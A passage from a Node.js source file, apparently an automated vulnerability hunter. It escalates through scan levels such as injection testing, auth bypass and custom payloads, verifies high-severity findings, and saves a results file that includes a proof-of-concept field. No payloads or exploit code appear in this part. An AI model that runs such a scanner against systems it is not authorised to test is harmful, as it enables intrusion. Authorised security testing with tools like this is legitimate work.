    { name: 'Business Logic & Chained Attacks', fn: level6BusinessLogic },
    { name: 'Custom Payloads & Edge Cases', fn: level7CustomPayloads },
  ];
  
  // Iterate through levels. If no vulnerability found, escalate.
  for (let level = 0; level < levels.length; level++) {
    currentLevel = level + 1;
    console.log(`\n${'─'.repeat(50)}`);
    console.log(`🔬 LEVEL ${currentLevel}: ${levels[level].name}`);
    console.log(`${'─'.repeat(50)}`);
    
    try {
      const findings = await levels[level].fn(target);
      allFindings.push(...findings);
      
      // Look for exploitable vulnerabilities (high+ severity)
      const exploitable = findings.filter(f => 
        f.severity === 'critical' || f.severity === 'high'
      );
      
      if (exploitable.length > 0) {
        // Verify each one
        for (const vuln of exploitable) {
          const verified = await verifyFinding(vuln, target);
          if (verified.verified && !verifiedVulnerability) {
            verifiedVulnerability = verified;
            console.log(`\n✅ VERIFIED VULNERABILITY FOUND at Level ${currentLevel}!`);
            console.log(`   Type: ${verified.type}`);
            console.log(`   Severity: ${verified.severity}`);
            console.log(`   ${verified.data?.slice(0, 200)}`);
          }
        }
      }
    } catch (e) {
      console.warn(`[vulnHunter] Level ${currentLevel} error: ${e.message}`);
    }
    
    // If we found a verified vulnerability, stop
    if (verifiedVulnerability) break;
    
    // Brief pause between levels
    await new Promise(r => setTimeout(r, 1000));
  }
  
  const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
  
  // ── Save results ──
  const result = {
    target,
    scanCompleted: true,
    duration: `${elapsed}s`,
    levelsCompleted: currentLevel,
    levelsTotal: maxLevels,
    totalFindings: allFindings.length,
    verifiedVulnerabilityFound: !!verifiedVulnerability,
    verifiedVulnerability: verifiedVulnerability ? {
      type: verifiedVulnerability.type,
      severity: verifiedVulnerability.severity,
      cve: verifiedVulnerability.cve || 'N/A',
      poc: verifiedVulnerability.poc,
      description: typeof verifiedVulnerability.data === 'string' 
        ? verifiedVulnerability.data.slice(0, 500) 
        : JSON.stringify(verifiedVulnerability.data).slice(0, 500)
    } : null,
    allFindings: allFindings.map(f => ({
      type: f.type,
      severity: f.severity || 'info',
      verified: f.verified || false,
      summary: typeof f.data === 'string' ? f.data.slice(0, 150) : JSON.stringify(f.data).slice(0, 150)
    })),
    summary: verifiedVulnerability 
      ? `✅ Found ${verifiedVulnerability.severity.toUpperCase()} vulnerability: ${verifiedVulnerability.type} (${verifiedVulnerability.cve || 'no CVE'})`
      : `⚠️ No verified high/critical vulnerability found after ${currentLevel}/${maxLevels} levels. Manual review recommended.`
  };
  
  fs.writeFileSync(VULN_RESULTS_FILE, JSON.stringify(result, null, 2));
  
  console.log(`\n${'='.repeat(60)}`);
  console.log(`📊 SCAN COMPLETE — ${elapsed}s`);
  console.log(`${'='.repeat(60)}`);
  console.log(`   Levels completed: ${currentLevel}/${maxLevels}`);
  console.log(`   Total findings: ${allFindings.length}`);
  console.log(`   Verified vulnerability: ${verifiedVulnerability ? 'YES ✅' : 'NO ❌'}`);
  if (verifiedVulnerability) {
    console.log(`   ── ${verifiedVulnerability.type.toUpperCase()} ──`);
    console.log(`   Severity: ${verifiedVulnerability.severity}`);
    console.log(`   CVE: ${verifiedVulnerability.cve || 'N/A'}`);
    console.log(`   PoC: ${String(verifiedVulnerability.poc || '').slice(0, 200)}`);
  }
  console.log(`   Results saved: ${VULN_RESULTS_FILE}`);
  console.log(`${'='.repeat(60)}\n`);
  
  return result;
}

module.exports = {
  vulnHunter,
  installAllTools,
  level1Recon,
  level2DirectoryEnum,
  level3CVEHunting,
  level4InjectionTesting,
  level5AuthBypass,
  level6BusinessLogic,
  level7CustomPayloads,
  verifyFinding,
  VULN_RESULTS_FILE
};